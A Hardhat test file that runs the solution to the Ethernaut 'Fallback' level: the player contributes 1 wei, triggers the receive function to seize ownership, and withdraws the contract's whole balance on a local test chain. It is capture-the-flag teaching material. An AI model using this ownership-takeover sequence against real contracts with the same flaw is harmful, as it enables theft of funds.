import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";
import { EventLog } from "ethers";
import hre from "hardhat";

import { Fallback, FallbackFactory, FallbackFactory__factory, Fallback__factory } from "../typechain-types";
import { FixtureAll, deployAll } from "./_fixtures";

describe("Fallback level", function () {
  let context: FixtureAll;

  beforeEach(async function () {
    context = await loadFixture(deployAll);
  });

  it("should be attacked successfully", async function () {
    // deploy and register level
    const level: FallbackFactory = await new FallbackFactory__factory(context.owner).deploy();
    await level.waitForDeployment();

    const levelAddress = await level.getAddress();
    await (await context.ethernaut.connect(context.owner).registerLevel(levelAddress)).wait();

    // create instance and get its address
    const tx = await context.ethernaut.connect(context.player).createLevelInstance(levelAddress);
    const receipt = await tx.wait();
    if (!receipt?.logs || receipt.logs.length === 0) {
      expect.fail("Transaction receipt logs are empty. Instance creation might have failed.");
    }
    const instanceAddress: string = (receipt.logs[0] as EventLog).args[1] as string;

    // expect level created instance
    await expect(receipt)
      .to.emit(context.ethernaut, "LevelInstanceCreatedLog")
      .withArgs(context.player, instanceAddress, levelAddress);

    // get level instance object
    const instance: Fallback = Fallback__factory.connect(instanceAddress, context.player);

    // attack:

    // 1) contribute 1 wei
    const txContrib = await instance.connect(context.player).contribute({ value: 1 });
    await expect(txContrib).to.not.reverted;
    await txContrib.wait();
    expect(await instance.connect(context.player).getContribution()).to.be.eq(1);

    // 2) trigger receive function
    const sendTx = await context.player.sendTransaction({ to: instanceAddress, value: 1 });
    await sendTx.wait();

    // check that ownership is claimed
    expect(await instance.owner()).to.eq(context.player);

    // withdraw instance funds
    const instanceBalanceBefore = await hre.ethers.provider.getBalance(instanceAddress);

    const playerBalanceBefore = await hre.ethers.provider.getBalance(context.player);
    const txWithdraw = await instance.connect(context.player).withdraw();
    await expect(txWithdraw).to.not.reverted;
    const rcptWithdraw = await txWithdraw.wait();
    if (!rcptWithdraw) {
      expect.fail("Withdraw tx receipt is empty.");
    }

    // instance balance should be zero
    expect(await hre.ethers.provider.getBalance(instanceAddress)).to.eq(0);

    // player balance should be increased correspondingly
    const playerBalanceAfter = await hre.ethers.provider.getBalance(context.player);
    expect(playerBalanceAfter).eq(
      instanceBalanceBefore + playerBalanceBefore - rcptWithdraw.gasUsed * rcptWithdraw.gasPrice,
    );

    // submit instance, check LevelCompleted event
    const rcptSubmit = await (await context.ethernaut.connect(context.player).submitLevelInstance(instance)).wait();
    await expect(rcptSubmit)
      .to.emit(context.ethernaut, "LevelCompletedLog")
      .withArgs(context.player, instanceAddress, levelAddress);

    // ensure that there is no failed submission
    expect(await context.statistics.getNoOfFailedSubmissionsForLevel(levelAddress)).to.be.equal(0);
  });
});
